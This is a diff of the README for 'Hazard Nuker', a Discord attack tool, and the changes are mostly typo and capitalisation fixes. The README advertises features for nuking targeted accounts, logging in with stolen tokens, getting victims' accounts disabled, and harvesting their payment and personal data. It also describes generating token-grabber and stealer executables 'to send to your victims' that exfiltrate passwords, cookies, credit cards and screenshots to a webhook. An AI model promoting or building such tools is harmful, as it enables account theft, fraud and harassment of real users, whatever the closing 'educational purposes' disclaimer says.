@@ -3,7 +3,7 @@
 <img src="https://img.shields.io/github/languages/top/Rdimo/Hazard-Nuker?style=flat-square" </a>
 <img src="https://img.shields.io/github/last-commit/Rdimo/Hazard-Nuker?style=flat-square" </a>
  <img src="https://img.shields.io/github/license/Rdimo/Hazard-Nuker?style=flat-square" </a>
-<img src="https://img.shields.io/github/downloads/Rdimo/Hazard-Nuker/total?color=%23daff00&label=v1.3.1 Downloads&style=flat-square" </a>
+<img src="https://img.shields.io/github/downloads/Rdimo/Hazard-Nuker/total?color=%23daff00&label=v1.3.3 Downloads&style=flat-square" </a>
 <img src="https://img.shields.io/github/stars/Rdimo/Hazard-Nuker?color=%23daff00&label=Stars&style=flat-square" </a>
 <img src="https://img.shields.io/github/forks/Rdimo/Hazard-Nuker?color=%23daff00&label=Forks&style=flat-square" </a>
 </p>
@@ -26,7 +26,7 @@ code ✅
 * ` Nuke a targetted account`
 * ` Unfriend all friends`
 * ` DM all friends`
-* ` delete and leave all servers`
+* ` Delete and leave all servers`
 * ` Spam Create New servers`
 * ` Delete all private DM's`
 * ` Spam switch between light/dark and languages`
@@ -52,13 +52,13 @@ code ✅
 * Will create 100 servers named whatever you want
 * Change language from ja to zh-TW to ko to zh-CN
 * Remove all friends
-* Send a choosen message to every friend they have
+* Send a chosen message to every friend they have
 * Everything will be logged and you can watch what happens on the cmd
 
 #### [2] Unfriend all friends
-* removes all friend the user has
+* Removes all friend the user has
 
-#### [3] delete and leave all servers
+#### [3] Delete and leave all servers
 * Leaves and deletes all the server the user has
 
 #### [4] Spam Create New servers
@@ -72,72 +72,72 @@ code ✅
 
 #### [7] Enable seizure mode
 * Switches between Light/dark mode as long as the console is open
-* also switches languages from ja to zh-TW to ko to zh-CN
+* Switches languages from ja to zh-TW to ko to zh-CN
 
 #### [8] Get information from a targetted account
 This is the info you get:
 * User ID
-* date account was created at
+* Date account was created at
 * Language
 * Badges
 * Avatar URL
 * Token
-* if they have 2fa on/off
+* If they have 2fa on/off
 * Email
 * Phone number if they have one
-* if they have nitro
-* if they have nitro you get how many days they have it for 
-* payment type (credit card/paypal)
-* if the payment is valid
-* name of the credit card/paypal
-* credit card/paypal Holder Name
-* credit card brand
-* credit card number (not the whole)
-* credit card expatriation date
-* paypal email
-* adress 1 and adress 2
-* their city
-* their postal code
-* their state
-* their country
-* and if the payment method is their default
-* if they have multiple credit cards connected you get those aswell
+* If they have nitro
+* If they have nitro you get how many days they have it for 
+* Payment type (credit card/paypal)
+* If the payment is valid
+* Name of the credit card/paypal
+* Credit card/Paypal Holder Name
+* Credit card brand
+* Credit card number (not the whole)
+* Credit card expiration date
+* Paypal email
+* Address 1 and address 2
+* Their city
+* Their postal code
+* Their state
+* Their country
+* If the payment method is their default
+* If they have multiple credit cards connected you get those aswell
 
 #### [9] Log into an account
 * Log into the account via their token
 * Make sure you have the correct Chromedriver.exe get it [here](https://chromedriver.chromium.org/downloads)
-* download the version corresponding to your chrome browsers version [How to get google version](https://www.businessinsider.com/what-version-of-google-chrome-do-i-have?op=1&r=US&IR=T)
+* Download the version corresponding to your chrome browsers version [How to get google version](https://www.businessinsider.com/what-version-of-google-chrome-do-i-have?op=1&r=US&IR=T)
 
 #### [10] Disable Account
-* changes their age to below 13 which is against Tos and leads to their acc to being disabled
+* Changes their age to below 13 which is against TOS and leads to their acc to being disabled
 
 #### [11] Status Changer
 * Changes their status
 * Made this mainly if your lazy like me since you can just log into their account and change their status.
 
 #### [12] Create Token Grabber
-Creates a token grabber in exe form that you can send to your victims and get their info thru a webhook
-Grabbs these Things upon running the exe :
-* username
-* user id
+Creates a token grabber in exe form that you can send to your victims and get their info through a webhook
+Grabs these Things upon running the exe :
+* Username
+* User id
 * Email
-* phone
-* nitro type
-* billing info
-* os
-* pc username
-* token location
-* ip
-* google maps location
-* city
-* region
-* local language
-* if they have verified email
-* if 2fa is enabled
-* creation date
-* their discord token from all their accounts they have
-* their password for discord (you get their password if they update it)
-* all of their credit card info (if they put one in)
+* Phone
+* Nitro type
+* Billing info
+* Operating System
+* PC username
+* Token location
+* IP
+* Google maps location
+* City
+* Region
+* Local language
+* If they have verified email
+* If 2fa is enabled
+* Creation date
+* Their discord token from all their accounts they have
+* Their password for discord (you get their password if they update it)
+* All of their credit card info (if they put one in)
 
 > Webhook looks like this:
 
@@ -146,17 +146,17 @@ Grabbs these Things upon running the exe :
 #### [13] Create Stealer
 Upon running the file you will get the following sent to your webhook:
 * Username
-* ComputerName
+* Computer Name
 * IP
 * City
 * Region
 * Country
 * Google Maps Location
 * Screenshot of their pc
-* All Their Valid Discord Tokens
-* Password For Discord (You get Their Password if They Update it)
-* Their Whole Credit Card (if They Put one in)
-* All Their Chrome Passwords And Cookies
+* All their Valid Discord Tokens
+* Password For Discord (You get their password if they update it)
+* Their Whole Credit Card (if They put one in)
+* All their Chrome Passwords And Cookies
 > Webhook looks like this:
 
 <p align="left"><img src="https://i.imgur.com/4KmwB6I.png"</p>
@@ -173,7 +173,7 @@ Upon running the file you will get the following sent to your webhook:
 
 #### [17] Webhook Destroyer
 * Choose between deleting or spamming a webhook
-* Can customize the Duration of spam and the message being sent
+* Can customize the duration of spam and the message being sent
 
 #### [18] Exit
 * Exit the program
@@ -216,10 +216,10 @@ Errors like these:
 
 > You probably have python 3.10 which has some new shit so downgrade to python 3.9 (https://www.python.org/downloads/release/python-397/)
 
-|🌟Star This Repository If You Liked Hazard Nuker!|
+|🌟Star This Repository if you liked Hazard Nuker!|
 |-------------------------------------------------|
 
-<a href="https://rdimo.github.io/CheatAway/" target="_blank"><img src="https://discordapp.com/api/guilds/864857288584724500/widget.png?style=banner2" alt="Cheataway"/></a>
+<a href="https://rdimo.github.io/CheatAway/" target="_blank"><img src="https://discordapp.com/api/guilds/899560455993966633/widget.png?style=banner2" alt="Cheataway"/></a>
 
 Created by Rdimo#6969 | https://rdimo.github.io/CheatAway
 |⚠️・Hazard Nuker was made for educational purposes・⚠️|
